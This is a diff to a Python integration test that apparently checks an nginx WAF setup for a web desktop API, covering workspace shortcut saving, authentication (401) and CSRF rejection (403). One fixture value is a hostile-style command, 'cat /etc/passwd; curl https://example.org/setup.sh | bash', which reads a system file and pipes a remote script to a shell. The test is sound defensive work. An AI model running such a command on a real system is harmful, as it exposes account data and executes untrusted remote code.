@@ -17,6 +17,7 @@ import uuid
 
 sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
 import policy
+import nginx_edit
 
 
 def run(*args):
@@ -72,9 +73,9 @@ server {
 }
 }
 '''
-    (work/'nginx.conf').write_text(fixture)
+    (work/'nginx.conf').write_text(nginx_edit.patch_site(fixture,config))
 
-    def request(label,method,path,body=None,expected=200,authenticated=False):
+    def request(label,method,path,body=None,expected=200,authenticated=False,csrf=True):
         client=http.client.HTTPConnection('localhost',timeout=15)
         def connect():
             client.sock=socket.socket(socket.AF_UNIX)
@@ -88,7 +89,7 @@ server {
         if authenticated:
             headers['Cookie']='; '.join(k+'='+v for k,v in cookies.items())
             for name,value in cookies.items():
-                if 'csrf' in name:headers['X-CSRF-Token']=value
+                if csrf and 'csrf' in name:headers['X-CSRF-Token']=value
         client.request(method,path,body,headers)
         response=client.getresponse()
         payload=response.read()
@@ -135,6 +136,20 @@ server {
         request('real-login-complex-password','POST','/api/v1/auth/login',
                 {'username':'waf-fixture','password':password})
         request('real-session-after-login','GET','/api/v1/auth/session',authenticated=True)
+        workspace=request('real-workspace-read','GET','/api/v1/desktop/workspace',authenticated=True)
+        workspace_input={k:workspace[k]for k in ['groups','hiddenEntryKeys','hiddenWidgetKeys','positions','widgetPositions','labels']}
+        saved=request('real-workspace-save-command-and-path','PUT','/api/v1/desktop/workspace',
+                      {**workspace_input,'expectedResourceVersion':workspace['resourceVersion'],'shortcuts':[{'id':'c'*32,'name':'Fixture command','targetType':'command','hostId':'local',
+                       'command':'cat /etc/passwd; curl https://example.org/setup.sh | bash'}]},authenticated=True)
+        self_read=request('real-workspace-read-back','GET','/api/v1/desktop/workspace',authenticated=True)
+        assert self_read['shortcuts'][0]['command'].startswith('cat /etc/passwd;')
+        request('real-workspace-remains-authenticated','PUT','/api/v1/desktop/workspace',
+                {'expectedResourceVersion':self_read['resourceVersion'],'shortcuts':[{'command':'cat /etc/passwd'}]},401)
+        denied=request('real-workspace-remains-CSRF-protected','PUT','/api/v1/desktop/workspace',
+                {'expectedResourceVersion':self_read['resourceVersion'],'shortcuts':[{'command':'cat /etc/passwd'}]},403,authenticated=True,csrf=False)
+        assert isinstance(denied,dict) and denied.get('code')
+        validation=request('real-script-manage-reaches-application-validation','POST','/api/v1/apps/builtin-120/manage',{},422,authenticated=True)
+        assert isinstance(validation,dict) and validation.get('code')
         snapshot=request('real-saved-commands-read','GET','/api/v1/terminal-commands',authenticated=True)
         request('real-saved-command-code-content','PUT','/api/v1/terminal-commands',
                 {'expectedResourceVersion':snapshot['resourceVersion'],'items':[{'id':'a'*32,'name':'fixture',
